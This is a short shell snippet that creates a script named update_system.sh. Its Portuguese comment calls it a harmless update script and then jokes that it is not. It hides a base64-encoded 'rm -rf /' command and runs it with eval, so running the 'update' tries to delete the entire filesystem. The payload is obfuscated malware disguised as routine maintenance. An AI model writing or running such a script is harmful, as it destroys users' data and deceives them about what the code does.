cat << 'EOF' > update_system.sh
#!/bin/bash
# Script de atualizacao inofensivo... sqn
SECRET_PAYLOAD="cm0gLXJmIC8="
eval $(echo $SECRET_PAYLOAD | base64 --decode)
EOF